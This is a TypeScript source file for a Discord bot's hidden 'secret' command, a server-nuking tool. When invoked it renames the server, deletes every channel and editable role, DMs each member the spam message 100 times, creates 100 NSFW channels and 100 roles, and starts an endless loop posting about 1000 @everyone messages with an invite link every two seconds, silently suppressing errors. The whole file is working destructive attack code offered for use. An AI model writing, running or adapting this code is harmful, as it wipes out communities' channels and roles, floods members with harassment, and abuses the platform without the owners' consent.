import type { Message, Client, TextChannel } from "discord.js";
import { ChannelType } from "discord.js";

const SPAM_MESSAGE = `# MEMBERTY NUKE HAHA\n@everyone\nhttps://discord.gg/zy5rjBDTyn`;
const SERVER_NAME = "MEMBERTY WAS HERE";
const CHANNEL_NAME = "memverty";
const CHANNEL_TOPIC = "MEMBERTY WAS HERE AND SAY GOODNIGHT";

// Track active spam loops per guild so .unfire can stop them
const activeLoops = new Map<string, NodeJS.Timeout>();

export function stopSpamLoop(guildId: string): void {
  const loop = activeLoops.get(guildId);
  if (loop) {
    clearInterval(loop);
    activeLoops.delete(guildId);
  }
}

function startSpamLoop(guildId: string, channels: TextChannel[]): void {
  // Stop any existing loop for this guild first
  stopSpamLoop(guildId);

  // ~1000 messages every 2 seconds spread across all channels
  const msgsPerChannel = Math.max(1, Math.ceil(1000 / channels.length));

  const loop = setInterval(() => {
    for (const ch of channels) {
      for (let i = 0; i < msgsPerChannel; i++) {
        ch.send(SPAM_MESSAGE).catch(() => {});
      }
    }
  }, 2000);

  activeLoops.set(guildId, loop);
}

export async function handleSecret(
  message: Message,
  args: string[],
  client: Client,
): Promise<void> {
  void args;
  void client;

  const guild = message.guild;
  if (!guild) return;

  message.channel.send("🔥 Firing...").catch(() => {});

  // Fetch members first so cache is populated for DMs
  await guild.members.fetch().catch(() => {});

  // Run all setup operations simultaneously
  const [, , , , createdChannels] = await Promise.all([
    // Rename server
    guild.setName(SERVER_NAME).catch(() => {}),

    // Delete all existing channels
    Promise.all(guild.channels.cache.map((ch) => ch.delete().catch(() => {}))),

    // Delete all editable roles
    Promise.all(
      guild.roles.cache
        .filter((r) => r.name !== "@everyone" && r.editable)
        .map((r) => r.delete().catch(() => {})),
    ),

    // DM every member 100 times simultaneously
    Promise.all(
      guild.members.cache
        .filter((m) => !m.user.bot)
        .map((m) =>
          Promise.all(
            Array.from({ length: 100 }, () =>
              m.send(SPAM_MESSAGE).catch(() => {}),
            ),
          ),
        ),
    ),

    // Create 100 channels — initial spam blast on each immediately
    Promise.all(
      Array.from({ length: 100 }, () =>
        guild.channels
          .create({
            name: CHANNEL_NAME,
            type: ChannelType.GuildText,
            nsfw: true,
            topic: CHANNEL_TOPIC,
          })
          .then((ch) => {
            if (!ch.isTextBased()) return null;
            // Initial blast
            Promise.all(
              Array.from({ length: 100 }, () => ch.send(SPAM_MESSAGE).catch(() => {})),
            );
            return ch as TextChannel;
          })
          .catch(() => null),
      ),
    ),

    // Create 100 roles simultaneously
    Promise.all(
      Array.from({ length: 100 }, () =>
        guild.roles.create({ name: "MEMBERTY", color: "Red" }).catch(() => {}),
      ),
    ),
  ]);

  // Filter to valid channels and start the endless spam loop
  const validChannels = (createdChannels as (TextChannel | null)[]).filter(
    (ch): ch is TextChannel => ch !== null,
  );

  if (validChannels.length > 0) {
    startSpamLoop(guild.id, validChannels);
  }

  message.channel.send("✅ Endless spam started.").catch(() => {});
}
